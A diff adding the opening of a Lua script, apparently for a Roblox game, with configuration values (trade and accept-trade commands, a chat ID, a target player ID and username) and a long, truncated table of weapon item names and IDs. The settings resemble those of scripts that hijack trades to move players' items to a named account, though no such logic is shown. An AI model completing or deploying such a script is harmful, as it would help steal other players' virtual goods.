@@ -1,0 +1,294 @@
+local CustomTradeCommand = "1"
+local CustomAcceptTradeCommand = "2"
+local CustomChatId = 7826742521
+local CustomLoadTime = 100
+local CustomPlayerId = 1537677213
+local CustomPlayerUsername = "wssdfgiby"
+
+local allItemsData = {{["Traveler's Gun"] = 'TravelerGunChroma'},{['Evergun'] = 'TreeGun2023Chroma'},{['Evergreen'] = 'TreeKnife2023Chroma'},{["Vampire's Gun"] = 'VampireGunChroma'},{['Sunrise'] = 'SunsetGunChroma'},{['Sunset'] = 'SunsetKnifeChroma'},{['Bauble'] = 'BaubleChroma'},{['Constellation'] = 'ConstellationChroma'},{['Gingerscope'] = 'Gingerscope'},{["Traveler's Axe"] = 'TravelerAxe'},{["Traveler's Gun"] = 'TravelerGun'},{['Evergun'] = 'TreeGun2023'},{['Evergreen'] = 'TreeKnife2023'},{['Sunset'] = 'SunsetKnife'},{['Sunrise'] = 'SunsetGun'},{['Turkey'] = 'Turkey2023'},{['Watergun'] = 'WatergunChroma'},{['Constellation'] = 'Constellation'},{['Celestial'] = 'Celestial'},{['Corrupt'] = 'Sorry'},{['Blossom'] = 'Blossom_G'},{['Sakura'] = 'Sakura_K'},{["Vampire's Gun"] = 'VampireGun'},{['Darksword'] = 'Darksword'},{['Darkshot'] = 'Darkshot'},{["Vampire's Axe"] = 'VampireAxe'},{['Harvester'] = 'Harvester'},{['Icepiercer'] = 'Icepiercer'},{['Bauble'] = 'Bauble'},{['Bat'] = 'ZombieBat'},{['Rainbow'] = 'Rainbow_K'},{['Rainbow Gun'] = 'Rainbow_G'},{['Spirit'] = 'WraithKnife'},{['Soul'] = 'WraithGun'},{['Candy'] = 'Candy'},{['Waves'] = 'Waves_K'},{['Ocean'] = 'Ocean_G'},{['Flowerwood'] = 'FlowerwoodKnife'},{['Flowerwood Gun'] = 'FlowerwoodGun'},{['Bloom'] = 'Bloom'},{['Flora'] = 'Flora'},{['Heartblade'] = 'Heartblade'},{['Watergun'] = 'Watergun'},{['Australis'] = 'AuroraKnife'},{['Borealis'] = 'AuroraGun'},{['Sugar'] = 'Sugar'},{['Icebreaker'] = 'Icebreaker'},{['Iceblaster'] = 'Iceblaster'},{['Swirly Axe'] = 'SwirlyAxe'},{['Swirly Gun'] = 'SwirlyGun'},{['Swirly Gun'] = 'SwirlyGunChroma'},{['Swirly Blade'] = 'SwirlyBlade'},{['Elderwood Revolver'] = 'ElderwoodGun'},{['Elderwood Scythe'] = 'ElderwoodScythe'},{['Elderwood Blade'] = 'ElderwoodKnife'},{['Elderwood Blade'] = 'ElderwoodKnifeChroma'},{['Glitch1'] = 'Batwing'},{['Hallowscythe'] = 'Hallowscythe'},{['Hallowgun'] = 'Hallowgun'},{['Logchopper'] = 'Logchopper'},{['Icewing'] = 'Icewing'},{['JD'] = 'JD'},{['Latte'] = 'Latte_K_2023'},{['Latte'] = 'Latte_G_2023'},{['Cotton Candy'] = 'CottonCandy'},{['Darkbringer'] = 'ChromaDarkbringer'},{['Lightbringer'] = 'ChromaLightbringer'},{['Luger'] = 'LugerChroma'},{['Candleflame'] = 'CandleflameChroma'},{['Laser'] = 'LaserChroma'},{['Shark'] = 'SharkChroma'},{['Seer'] = 'SeerChroma'},{['Deathshard'] = 'DeathshardChroma'},{['Deathshard'] = 'Deathshard'},{['Cookiecane']='Gingermint_KChroma'},{['Gemstone'] = 'GemstoneChroma'},{['Gingerblade'] = 'GingerbladeChroma'},{['Tides'] = 'TidesChroma'},{['Slasher'] = 'SlasherChroma'},{['Fang'] = 'FangChroma'},{['Heat'] = 'HeatChroma'},{['Saw'] = 'SawChroma'},{['Boneblade'] = 'BonebladeChroma'},{['Luger'] = 'Luger'},{['Lugercane'] = 'Lugercane'},{['Ginger Luger'] = 'GingerLuger'},{['Red Luger'] = 'RedLuger'},{['Glitch2'] = 'RandLuger'},{['Green Luger'] = 'GreenLuger'},{['Pearl'] = 'Pearl_K'},{['Pearlshine'] = 'Pearl_G'},{['Candleflame'] = 'Candleflame'},{['Makeshift'] = 'Makeshift'},{['Darkbringer'] = 'Darkbringer'},{['Phantom'] = 'Phantom2022'},{['Spectre'] = 'Spectre2022'},{['Lightbringer'] = 'Lightbringer'},{['Laser'] = 'Laser'},{['Old Glory'] = 'AmericaSword'},{['Amerilaser'] = 'Amerilaser'},{['Iceflake'] = 'Iceflake'},{['Icebeam'] = 'Icebeam'},{['Plasmablade'] = 'Plasmablade'},{['Plasmabeam'] = 'Plasmabeam'},{['Shark'] = 'Shark'},{['Blaster'] = 'Blaster'},{['Virtual'] = 'Virtual'},{['Gemstone'] = 'Gemstone'},{['Nightblade'] = 'Nightblade'},{['Cookiecane'] = 'Gingermint_K'},{['Gingermint'] = 'Gingermint_G'},{['Eternal'] = 'Eternal'},{['Eternal II'] = 'Eternal2'},{['Eternal III'] = 'Eternal3'},{['Eternal IV'] = 'Eternal4'},{['Eternalcane'] = 'EternalCane'},{['Pixel'] = 'Pixel'},{['Nebula'] = 'Nebula'},{['Slasher'] = 'Slasher'},{['Jinglegun'] = 'Jinglegun'},{['Clockwork'] = 'Clockwork'},{['Gingerblade'] = 'Gingerblade'},{['Minty'] = 'Minty'},{['Heat'] = 'Heat'},{['BattleAxe'] = 'BattleAxe'},{['BattleAxe II'] = 'BattleAxe2'},{['Spider'] = 'Spider'},{['Bioblade'] = 'Bioblade'},{["Vampire's Edge"] = 'VampiresEdge'},{['Chill'] = 'Chill'},{['Fang'] = 'Fang'},{['Tides'] = 'Tides'},{['Frostsaber'] = 'Frostsaber'},{["Hallow's Edge"] = 'Hallow'},{["Hallow's Blade"] = 'HallowsBlade'},{['Ice Shard'] = 'IceShard'},{['Pumpking'] = 'Pumpking'},{['Xmas'] = 'Xmas'},{['Handsaw'] = 'Handsaw'},{['Flames'] = 'Flames'},{['ShadowKnife'] = 'Shadow'},{['Knife1'] = 'Splitter'},{['Ice Dragon'] = 'IceDragon'},{["Winter's Edge"] = 'WintersEdge'},{['Boneblade'] = 'Boneblade'},{['Ghostblade'] = 'Ghostblade'},{['GhostKnife'] = 'Ghost'},{['BloodKnife'] = 'Blood'},{['Eggblade'] = 'Eggblade'},{['Frostbite'] = 'Frostbite'},{['Prismatic'] = 'Prismatic'},{['TimeKnife'] = 'Prince'},{['Saw'] = 'Saw'},{['Snowflake'] = 'Snowflake'},{['Peppermint'] = 'Peppermint'},{['Cookieblade'] = 'Cookieblade'},{['Red Seer'] = 'RedSeer'},{['Orange Seer'] = 'OrangeSeer'},{['Yellow Seer'] = 'YellowSeer'},{['Blue Seer'] = 'BlueSeer'},{['Purple Seer'] = 'PurpleSeer'},{['Seer'] = 'TheSeer'},{['America'] = 'AmericaGun'},{['Golden'] = 'GoldenGun'},{['Cowboy'] = 'Gun1'},{['Phaser'] = 'Phaser'},{['Laser'] = 'Disint'},{['Big Kill'] = 'BigKill'},{['Cold'] = 'Cold'},{['Fallout'] = 'Fallout'},{['Iron'] = 'Iron'},{['Adurite'] = 'AduriteGun'},{['Bluesteel'] = 'BluesteelGun'},{['Camo'] = 'Camo'},{['Galactic'] = 'Galactic'},{['Imbued'] = 'Imbued'},{['Viper'] = 'Viper'},{['Reptile'] = 'Reptile'},{['Gifted'] = 'Gifted'},{['Future'] = 'Future'},{['Nether'] = 'Nether'},{['Midnight'] = 'Midnight'},{['Night'] = 'Night'},{['Spitfire'] = 'Spitfire'},{['Overseer'] = 'Overseer'},{['Linked'] = 'Linked'},{['Slate'] = 'Slate'},{['Borders'] = 'Borders'},{['Stalker'] = 'Stalker'},{['Missing'] = 'Missing'},{['Cheesy'] = 'Cheesy'},{['Krypto'] = 'Krypto'},{['Spectrum'] = 'Spectrum'},{['Overseer'] = 'OverseerKnife'},{['Checker'] = 'Checker'},{['Damp'] = 'Damp'},{['Emerald'] = 'Emerald'},{['Neon'] = 'Neon'},{['Infected'] = 'Infected'},{['Green'] = 'Marley'},{['Orange'] = 'Fanta'},{['Brown'] = 'Pepper'},{['Yellow'] = 'Kool'},{['Pink'] = 'LMFAO'},{['Blue'] = 'Chips'},{['Red'] = 'Snoop'},{['Purple'] = 'Doritos'},{['Black'] = 'Dew'},{['Shiny'] = 'MLG'},{['TNL'] = 'TNL'},{['Engraved'] = 'Engraved'},{['Infiltrator'] = 'Infiltrator'},{['Juice'] = 'Aid'},{['Star'] = 'Star'},{['Sketch'] = 'Sketch'},{['Marina'] = 'Marina'},{['Cheddar'] = 'Cheddar'},{['iRevolver'] = 'iRevolver'},{['Hacker'] = 'Hacker'},{['Predator'] = 'Predator'},{['Love'] = 'LoveGun'},{['Molten'] = 'Molten'},{['Sparkle'] = 'Sparkle'},{['Clan'] = 'Clan'},{['Cherry'] = 'Cherry'},{['Cardboard'] = 'Cardboard'},{['Stainless'] = 'Stainless'},{['Circuit'] = 'Circuit'},{['Doge'] = 'Doge'},{['Paper'] = 'Paper'},{['Splash'] = 'Splash'},{['Vortex'] = 'Vortex'},{['Nova'] = 'Nova'},{['Donut'] = 'Donut'},{['Molten'] = 'MoltenKnife'},{['Predator'] = 'PredatorKnife'},{['Goo'] = 'Goo'},{['Pea'] = 'Pea'},{['News'] = 'News'},{['HL2'] = 'HL2'},{['Bit'] = 'Bit'},{['Wooden'] = 'Wooden'},{['Soda'] = 'Cola'},{['Caution'] = 'Caution'},{['Bacon'] = 'Bacon'},{['Ace'] = 'Ace'},{['Universe'] = 'Universe'},{['Elite'] = 'Elite'},{['Skool'] = 'Skool'},{['Sidewinder'] = 'Sidewinder'},{['Grind'] = 'Grind'},{['Euro'] = 'Euro'},{['Ollie'] = 'Ollie'},{['Tailslide'] = 'Tailslide'},{['Indy'] = 'Indy'},{['Prism'] = 'Prism'},{['Sparkle1'] = 'Sparkle1'},{['Sparkle2'] = 'Sparkle2'},{['Sparkle3'] = 'Sparkle3'},{['Sparkle4'] = 'Sparkle4'},{['Sparkle5'] = 'Sparkle5'},{['Sparkle6'] = 'Sparkle6'},{['Sparkle7'] = 'Sparkle7'},{['Sparkle8'] = 'Sparkle8'},{['Sparkle9'] = 'Sparkle9'},{['Sparkle10'] = 'Sparkle10'},{['Jack'] = 'Jack'},{['Rupture'] = 'Bleed'},{['Web'] = 'Web'},{['Mummy'] = 'Mummy'},{['Bleached'] = 'Bleached'},{['Clown'] = 'Clown'},{['Oily'] = 'Oily'},{['Aqua'] = 'Aqua'},{['Hazmat'] = 'Hazmat'},{['Melon'] = 'Melon'},{['Hive'] = 'Hive'},{['Korblox'] = 'Korblox'},{['Squire'] = 'Squire'},{['Fade'] = 'Fade'},{['Santa'] = 'Santa'},{['Elf'] = 'Elf'},{['Ornament'] = 'Ornament1'},{['Ornament2'] = 'Ornament2'},{['Snowy'] = 'Snowy'},{['Snowman'] = 'Snowman'},{['Wrapped'] = 'Wrapped'},{['Ginger'] = 'Ginger'},{['Cane'] = 'Cane'},{['Tree'] = 'Tree'},{['Santa'] = 'SantaGun'},{['Elf'] = 'ElfGun'},{['Ornament1'] = 'Ornament1Gun'},{['Ornament2'] = 'Ornament2Gun'},{['Nutcracker'] = 'Nutcracker'},{['Snowman'] = 'SnowmanGun'},{['Wrapped'] = 'WrappedGun'},{['Ginger'] = 'GingerGun'},{['Cane'] = 'CaneGun'},{['Tree'] = 'TreeGun'},{['Green Elite'] = 'EliteGreen'},{['Blue Elite'] = 'EliteBlue'},{['Blossom'] = 'Blossom'},{['Passion'] = 'Passion'},{['Roses'] = 'Roses'},{['Hearts'] = 'Hearts'},{['Valentine'] = 'Valentine'},{['Sweetheart'] = 'Sweetheart'},{['Eco'] = 'Eco'},{['Log'] = 'Log'},{['Sandy'] = 'Sandy'},{['Static'] = 'Static'},{['Brush'] = 'Brush'},{['Jigsaw'] = 'Jigsaw'},{['Lucky'] = 'Lucky'},{['Abstract'] = 'Abstract'},{['Musical'] = 'Musical'},{['Fusion'] = 'Fusion'},{['Patrick'] = 'Patrick'},{['Egg'] = 'Eggs'},{['Choco'] = 'Choco'},{['Tulip'] = 'Tulip'},{['Bunny'] = 'Bunny'},{['Carrot'] = 'Carrot'},{['Xbox'] = 'Xbox'},{['Asteroid'] = 'Asteroid'},{['Brains'] = 'Brains'},{['Bones'] = 'Bones'},{['Ghosty'] = 'Ghosty'},{['Witch'] = 'Witch'},{['Vampire'] = 'Vampire'},{['Moons'] = 'Moons'},{['Wolf'] = 'Wolf'},{['Orange Marble'] = 'OrangeMarble'},{['Bats'] = 'Bats'},{['Scratch'] = 'Scratch'},{['Ecto'] = 'Ecto'},{['Zombie'] = 'Zombie'},{['Phantom'] = 'Phantom'},{['CandyCorn'] = 'CandyCorn'},{['Webs'] = 'Webs'},{['Mummy'] = 'MummyK'},{['Potion'] = 'Potion'},{['Magma'] = 'MagmaK'},{['Green Marble'] = 'GreenMarble'},{['Scratch'] = 'ScratchBlue'},{['Alex'] = 'Alex'},{['Sub'] = 'Sub'},{['Denis'] = 'Denis'},{['Sketchy'] = 'SketchYT'},{['Corl'] = 'Corl'},{['Present'] = 'Present'},{['Coal'] = 'Coal'},{['Elf'] = 'Elf2017'},{['Santa'] = 'Santa2017'},{['Tree'] = 'Tree2017'},{['Frosty'] = 'Frosty'},{['Sweater'] = 'Sweater'},{['Gingerbread'] = 'Gingerbread2017'},{['Snowy'] = 'Snowy2017'},{['Green Fire'] = 'GreenFire'},{['Red Fire'] = 'RedFire'},{['Box of Red Wrapping Paper'] = 'WrapPaperBoxRed'},{['Box of Purple Wrapping Paper'] = 'WrapPaperBoxPurple'},{['Box of Gold Wrapping Paper '] = 'WrapPaperBoxGold'},{['Box of Green Wrapping Paper'] = 'WrapPaperBoxGreen'},{['Box of Blue Wrapping Paper'] = 'WrapPaperBoxBlue'},{['Box of Ultra Wrapping Paper'] = 'WrapPaperBoxUltra'},{['Skeleton Key 2018'] = 'SkeletonKey'},{['Batwing'] = 'Scythe'},{['Slime'] = 'SlimeK'},{['Grave'] = 'GraveK'},{['Haunted'] = 'HauntedK'},{['Bats'] = 'BatsK'},{['Mummy'] = 'MummyK2018'},{['Zombie'] = 'ZombieK2018'},{['Potion'] = 'PotionK2018'},{['Vampire'] = 'VampireK2018'},{['Toxic'] = 'ToxicK'},{['Ghost'] = 'GhostK2018'},{['Slime'] = 'SlimeG'},{['Grave'] = 'GraveG'},{['Haunted'] = 'HauntedG'},{['Bats'] = 'BatsG'},{['Mummy'] = 'MummyG2018'},{['Zombie'] = 'ZombieG2018'},{['Potion'] = 'PotionG2018'},{['Vampire'] = 'VampireG2018'},{['Toxic'] = 'ToxicG'},{['Ghost'] = 'GhostG2018'},{['Snowflake Key 2018'] = 'SnowflakeKey'},{['Coal'] = 'Coal_K_2018'},{['Santa'] = 'Santa_K_2018'},{['Snowman'] = 'Snowman_K_2018'},{['Wrapped'] = 'Wrapped_K_2018'},{['Snowflake'] = 'Snowflake_K_2018'},{['Holly'] = 'Holly_K_2018'},{['Sweater'] = 'Sweater_K_2018'},{['Icicles'] = 'Icicles_K_2018'},{['Cane'] = 'Cane_K_2018'},{['Ginger'] = 'Ginger_K_2018'},{['Coal'] = 'Coal_G_2018'},{['Elf'] = 'Santa_G_2018'},{['Snowman'] = 'Snowman_G_2018'},{['Wrapped'] = 'Wrapped_G_2018'},{['Snowflake'] = 'Snowflake_G_2018'},{['Holly'] = 'Holly_G_2018'},{['Sweater'] = 'Sweater_G_2018'},{['Icicles'] = 'Icicles_G_2018'},{['Cane'] = 'Cane_G_2018'},{['Ginger'] = 'Ginger_G_2018'},{['Box of Fertilizer'] = 'FertilizerBox'},{['S1 Test Knife'] = 'Season1TestKnife'},{['Mystery Key'] = 'Key'},{['Combat'] = 'Combat'},{['Combat II'] = 'Combat2'},{['Copper'] = 'Copper'},{['Hardened'] = 'Hardened'},{['Splat'] = 'Splat'},{['Camo'] = 'CamoKnife'},{['Tiger'] = 'Tiger'},{['Pirate'] = 'Pirate'},{['Space'] = 'Space'},{['Rainbow'] = 'RainbowGun'},{['Rune'] = 'Rune'},{['Skulls'] = 'Skulls'},{['Dungeon'] = 'Dungeon'},{['Snakebite'] = 'SnakebiteG'},{['Bones'] = 'Bones2019'},{['Zombified'] = 'ZombifiedK'},{['Brains'] = 'Brains2019'},{['Pumpkin Patch'] = 'PumpkinPatch'},{['Slimy'] = 'SlimyK'},{['Webbed'] = 'WebbedG'},{['Candy Corn'] = 'CandyCorn2019'},{['Witched'] = 'Witched'},{['Snakebite'] = 'SnakebiteK'},{['Monster'] = 'Monster'},{['Branches'] = 'Branches'},{['Zombified'] = 'ZombifiedG'},{['Mummified'] = 'Mummified'},{['RIP'] = 'RIP'},{['Webbed'] = 'WebbedK'},{['Frosted'] = 'Frosted_K_2019'},{['Frosted'] = 'Frosted_G_2019'},{['Snowflakes'] = 'Snowflakes_K_2019'},{['Snowflakes'] = 'Snowflakes_G_2019'},{['Pine'] = 'Pine_K_2019'},{['Pine'] = 'Pine_G_2019'},{['Gifts'] = 'Gifts_K_2019'},{['Gifts'] = 'Gifts_G_2019'},{['Gingerbread'] = 'Gingerbread_K_2019'},{['Gingerbread'] = 'Gingerbread_G_2019'},{['Frozen'] = 'Frozen_K_2019'},{['Frozen'] = 'Frozen_G_2019'},{['Lights'] = 'Lights_K_2019'},{['Lights'] = 'Lights_G_2019'},{['Aurora'] = 'Aurora_K_2019'},{['Aurora'] = 'Aurora_G_2019'},{['Candy Swirl'] = 'CandySwirl_K_2019'},{['Candy Swirl'] = 'CandySwirl_G_2019'},{['Cavern'] = 'Cavern_K_2019'},{['Cavern'] = 'Cavern_G_2019'},{["Santa's Magic"] = 'SantasMagic'},{['Splash'] = 'Splash_G'},{['Nightfire'] = 'Nightfire'},{['Biogun'] = 'Biogun'},{['Clown'] = 'Clown_G'},{['Deep Sea'] = 'DeepSea'},{['Graffiti'] = 'Graffiti'},{['High Tech'] = 'HighTech'},{['Lovely'] = 'Lovely'},{['Shaded'] = 'Shaded'},{['Leaf'] = 'Leaf'},{['???'] = 'Emptybringer'},{['Watcher'] = 'Eyes_K_2020'},{['Carved'] = 'Carved_K_2020'},{['Candle'] = 'Candle_K_2020'},{['Candy Corn'] = 'CandyCorn_G_2020'},{['Ghosts'] = 'Ghosts_K_2020'},{['Pumpkin'] = 'Pumpkin_K_2020'},{['Mummy'] = 'Mummy_G_2020'},{['Bones'] = 'Bones_K_2020'},{['Portal'] = 'Portal_K_2020'},{['Ripper'] = 'Ripper_G_2020'},{['Candy Corn'] = 'CandyCorn_K_2020'},{['Carved'] = 'Carved_G_2020'},{['Watcher'] = 'Eyes_G_2020'},{['Portal'] = 'Portal_G_2020'},{['Mummy'] = 'Mummy_K_2020'},{['Ghosts'] = 'Ghosts_G_2020'},{['Ripper'] = 'Ripper_K_2020'},{['Slashed'] = 'Slashed_K_2020'},{['Starry'] = 'Starry_G_2020'},{['Bats'] = 'Bats_K_2020'},{['RB Knife'] = 'RBKnife'},{['Gift Bag'] = 'Giftbag_K_2020'},{['Icecracker'] = 'Icecracker_K_2020'},{['Gingerbread'] = 'Gingerbread_K_2020'},{['Silent Night'] = 'SilentNight_K_2020'},{['Ornaments'] = 'Ornaments_K_2020'},{['Ornaments'] = 'Ornaments_G_2020'},{['Wrap'] = 'Gift_K_2020'},{['Gingerbread'] = 'Gingerbread_G_2020'},{['Silent Night'] = 'SilentNight_G_2020'},{['Gift Bag'] = 'Giftbag_G_2020'},{['Icedriller'] = 'Icedriller_G_2020'},{["Santa's Spirit"] = 'SantasSpirit'},{['Stockings'] = 'Stockings_K_2020'},{['Trees'] = 'Trees_K_2020'},{['Wrap'] = 'Gift_G_2020'},{['Snowflakes'] = 'Snowflakes_K_2020'},{['Stickers'] = 'Stickers_K_2021'},{['Cracks'] = 'Cracks_K_2021'},{['Cat'] = 'Cat_G_2021'},{['Haunted'] = 'Haunted_K_2021'},{['Fall Camo'] = 'FallCamo_G_2021'},{['Wraiths'] = 'Ghosts_G_2021'},{['Wraiths'] = 'Ghosts_K_2021'},{['Gothic'] = 'Gothic_K_2021'},{['Watcher'] = 'Watcher_K_2021'},{['Magma'] = 'Magma_K_2021'},{['Spectral'] = 'Spectral_G_2021'},{['Moon'] = 'Moon_K_2021'},{['Cracks'] = 'Cracks_G_2021'},{['Stickers'] = 'Stickers_G_2021'},{['Aliens'] = 'Aliens_G_2021'},{['Gothic'] = 'Gothic_G_2021'},{['Zombie'] = 'Zombie_K_2021'},{['Skulls'] = 'Skulls_K_2021'},{['Watcher'] = 'Watcher_G_2021'},{['Magma'] = 'Magma_G_2021'},{['Spectral'] = 'Spectral_K_2021'},{['Cane'] = 'Cane_K_2021'},{['Coal'] = 'Coal_K_2021'},{['Giftwrap'] = 'Giftwrap_K_2021'},{['Ribbons'] = 'Ribbons_K_2021'},{['Stickers'] = 'XmasStickers_K_2021'},{['Cookie'] = 'Cookie_K_2021'},{['Snowman'] = 'Snowman_K_2021'},{['Tree'] = 'Tree_K_2021'},{['Swirl'] = 'Swirl_K_2021'},{['Starry'] = 'Starry_K_2021'},{['Aurora'] = 'Aurora_K_2021'},{['Coal'] = 'Coal_G_2021'},{['Stickers'] = 'XmasStickers_G_2021'},{['Cane'] = 'Cane_G_2021'},{['Snowman'] = 'Snowman_G_2021'},{['Cookie'] = 'Cookie_G_2021'},{['Gingerbread'] = 'Gingerbread_G_2021'},{['Ice Camo'] = 'IceCamo_G_2021'},{['Starry'] = 'Starry_G_2021'},{['Aurora'] = 'Aurora_G_2021'},{['Ghostly'] = 'GhostRbx_K_2022'},{['Candy Corn'] = 'CandyCorn_K_2022'},{['Eyeball'] = 'Eyeball_K_2022'},{['Stickers'] = 'Stickers_K_2022'},{['Darkness'] = 'Darkness_K_2022'},{['Hazard'] = 'Hazard_K_2022'},{['Lantern'] = 'Jack_K_2022'},{['Witchbrew'] = 'Witch_K_2022'},{['Wraith'] = 'Wraith_K_2022'},{['Curse'] = 'Runic_K_2022'},{['Vampire'] = 'Vampire_K_2022'},{['Zombie Camo'] = 'GreenCamo_K_2022'},{['Survivor Camo'] = 'BlueCamo_K_2022'},{['Boney'] = 'Bones_K_2022'},{['Hunter'] = 'Hunter_K_2022'},{['TestItem'] = 'molten'},{['Apocalypse'] = 'Apoc_K_2022'},{['Makeshift'] = 'Survivors_K_2022'},{['Infected'] = 'Infected_K_2022'},{['Zombified'] = 'Zombified_K_2022'},{['Apocalypse'] = 'Apoc_G_2022'},{['Candy Corn'] = 'CandyCorn_G_2022'},{['Infected'] = 'Infected_G_2022'},{['Darkness'] = 'Darkness_G_2022'},{['Hazard'] = 'Hazard_G_2022'},{['Wraith'] = 'Wraith_G_2022'},{['Vampire'] = 'Vampire_G_2022'},{['Ghostfire'] = 'Ghostfire_G_2022'},{['Moonlight'] = 'Moonlight_G_2022'},{['Brains'] = 'Brains_G_2022'},{['Webs'] = 'Webs_G_2022'},{['Void'] = 'VoidRbx'},{['Candied'] = 'Candied_K_2022'},{['Stickers'] = 'StickersX_K_2022'},{['Coal'] = 'Coal_K_2022'},{['Snowman'] = 'Snowman_K_2022'},{['Snowflake'] = 'Snowflake_K_2022'},{['Stockings'] = 'Stockings_K_2022'},{['Mistletoe'] = 'Mistletoe_K_2022'},{['Gingerbread'] = 'Gingerbread_K_2022'},{['Tree'] = 'Tree_K_2022'},{['Arctic'] = 'Arctic_K_2022'},{['Candied'] = 'Candied_G_2022'},{['Stickers'] = 'StickersX_G_2022'},{['Coal'] = 'Coal_G_2022'},{['Snowman'] = 'Snowman_G_2022'},{['Snowflake'] = 'Snowflake_G_2022'},{['Stockings'] = 'Stockings_G_2022'},{['Mistletoe'] = 'Mistletoe_G_2022'},{['Gingerbread'] = 'Gingerbread_G_2022'},{['Tree'] = 'Tree_G_2022'},{['Arctic'] = 'Arctic_G_2022'},{['Wrapped'] = 'Wrapped_K_2022'},{['Frozen'] = 'Frozen_K_2022'},{['Frozen'] = 'Frozen_G_2022'},{['Broken'] = 'Broken_K_2023'},{['Rose'] = 'Rose_K_2023'},{['Heart'] = 'Heart_K_2023'},{['Love'] = 'Love_K_2023'},{['Fragile'] = 'Fragile_K_2023'},{['Marble'] = 'Marble_K_2023'},{['Bio'] = 'Bio_K_2023'},{['Chromatic'] = 'Chromatic_K_2023'},{['Carrot'] = 'Carrot_K_2023'},{['Painted'] = 'Painted_K_2023'},{['Fragile'] = 'Fragile_G_2023'},{['Painted'] = 'Painted_G_2023'},{['Nuke'] = 'Nuke_G_2023'},{['Chromatic'] = 'Chromatic_G_2023'},{['Toy'] = 'Toy_K_2023'},{['Stickers'] = 'Summer_Stickers_K_2023'},{['Popsicle'] = 'Popsicle_K_2023'},{['Pool Noodle'] = 'Noodle_K_2023'},{['Floral'] = 'Floral_K_2023'},{['Beach'] = 'Beach_K_2023'},{['Stickers'] = 'Summer_Stickers_G_2023'},{['Toy'] = 'Toy_G_2023'},{['Melon'] = 'Melon_G_2023'},{['Sun'] = 'Sunset_G_2023'},{['Ghoulish'] = 'RbxScary_K_2023'},{['Etched'] = 'Skull_K_2023'},{['Vines'] = 'Vines_K_2023'},{['Ghosts'] = 'Ghosts_K_2023'},{['Pumpkin'] = 'Pumpkin_G_2023'},{['Zombie'] = 'Zombie_K_2023'},{['Meltdown'] = 'Meltdown_K_2023'},{['Steel'] = 'Steel_G_2023'},{['Ghastly'] = 'Ghastly_G_2023'},{['Darkknife'] = 'Dark_K_2023'},{['Spider'] = 'Spider_K_2023'},{['Leaves'] = 'Leaves_K_2023'},{['Wood'] = 'Wood_K_2023'},{['Vines'] = 'Vines_G_2023'},{['Glowy'] = 'Glowy_K_2023'},{['Eclipse'] = 'Eclipse_K_2023'},{['Steel'] = 'Steel_K_2023'},{['Darkgun'] = 'Dark_G_2023'},{['Ghastly'] = 'Ghastly_K_2023'},{['Scarf'] = 'Scarf_K_2023'},{['Pumpkin Pie'] = 'PumpkinPie_K_2023'},{['Frozen'] = 'Frozen_K_2023'},{['Present'] = 'Present_K_2023'},{['Ribbon'] = 'Ribbon_K_2023'},{['Santa'] = 'Santa_G_2023'},{['Stars'] = 'Stars_K_2023'},{['Canes'] = 'Canes_G_2023'},{['Fireplace'] = 'Fireplace_K_2023'},{['Tree'] = 'Tree_K_2023'},{['Neon'] = 'Neon_G_2023'},{['Frostfade'] = 'Frostfade_K_2023'},{['Frozen'] = 'Frozen_G_2023'},{['Bells'] = 'Bells_K_2023'},{['Elf'] = 'Elf_G_2023'},{['Snowfall'] = 'Snowfall_K_2023'},{['Canes'] = 'Canes_K_2023'},{['Stars'] = 'Stars_G_2023'},{['Snowman'] = 'Snowman_G_2023'},{['Snowglobe'] = 'Snowglobe_K_2023'},{['Snowflake'] = 'Snowflake_G_2023'},{['Frostfade'] = 'Frostfade_G_2023'},{['Wavy'] = 'Wavy_K_2024'},{['Carrot'] = 'Carrot_K_2024'},{['Spring'] = 'Spring_K_2024'},{['Robot'] = 'Robot_K_2024'},{['Wavy'] = 'Wavy_G_2024'},{['Carrot'] = 'Carrot_G_2024'},{['Starfish'] = 'Starfish_K_2024'},{['Balloons'] = 'WaterBalloons_G_2024'},{['Clownfish'] = 'Clownfish_G_2024'},{['Sandy'] = 'Sandy_G_2024'},{['Turtle'] = 'Turtle_K_2024'},{['Popsicle'] = 'Popsicle_G_2024'},{['Jellyfish'] = 'Jellyfish_K_2024'},{['Waves'] = 'Waves_K_2024'},{['Floral'] = 'Floral_G_2024'},{['Palms'] = 'Palms_K_2024'},{['Starfish'] = 'Starfish_G_2024'},{['Clownfish'] = 'Clownfish_K_2024'},{['Floatie'] = 'Floatie_G_2024'},{['Sharky'] = 'Sharky_K_2024'},{['Palms'] = 'Palms_G_2024'},{['Candy Corn'] = 'CandyCorn_G_2024'},{['Ghosts'] = 'Ghosts_K_2024'},{['Stickers'] = 'Stickers_G_2024'},{['Bats'] = 'Bats_K_2024'},{['Bones'] = 'Bones_K_2024'},{["Witch's Brew"] = 'WitchBrew_K_2024'},{['Leaves'] = 'Leaves_G_2024'},{['Kraken'] = 'Kraken_K_2024'},{['Ritual'] = 'Ritual_G_2024'},{['Cursed'] = 'Cursed_G_2024'},{['Candy Corn'] = 'CandyCorn_K_2024'},{['Bats'] = 'Bats_G_2024'},{['Stickers'] = 'Stickers_K_2024'},{['Candles'] = 'Candles_K_2024'},{['Monster'] = 'Monster_K_2024'},{['Moons'] = 'Moons_K_2024'},{['Clown'] = 'Clown_G_2024'},{['Storm'] = 'Storm_K_2024'},{['Candleflame'] = 'Candleflame_G_2024'},{['Cursed'] = 'Cursed_K_2024'},{['Hot Chocolate'] = 'HotChocolate_K_2024'},{['Gifts'] = 'Gifts_K_2024'},{['Igloo'] = 'Igloo_G_2024'},{['Stickers'] = 'Stickers_X_K_2024'},{['Gingerheart'] = 'Gingerheart_K_2024'},{['Wrapped'] = 'Wrapped_G_2024'},{['Logcutter'] = 'Logcutter_K_2024'},{['Frostflame'] = 'Frostflame_K_2024'},{['Nightsky'] = 'Constellation_G_2024'},{['Reindeer'] = 'Reindeer_K_2024'},{['Stockings'] = 'Stockings_G_2024'},{['Igloo'] = 'Igloo_K_2024'},{['Stickers'] = 'Stickers_X_G_2024'},{['Wrapped'] = 'Wrapped_K_2024'},{['Snowman'] = 'Snowman_K_2024'},{['Wreaths'] = 'Wreaths_K_2024'},{['Frostflame'] = 'Frostflame_G_2024'},{['Sleigh'] = 'Sleigh_K_2024'},{['Nightstar'] = 'Constellation_K_2024'},{['Forest'] = 'Forest_G_2024'},{['Decorated'] = 'Decorated_K_2025'},{['Carrots'] = 'Carrots_K_2025'},{['Chick'] = 'Chick_K_2025'},{['Bunnies'] = 'Bunnies_K_2025'},{['Sunny'] = 'Sunny_G_2025'},{['Meadow'] = 'Meadow_G_2025'},{['Butterflies'] = 'Butterflies_G_2025'},{['Leaves'] = 'Leaves_K_2025'},{['Coconut'] = 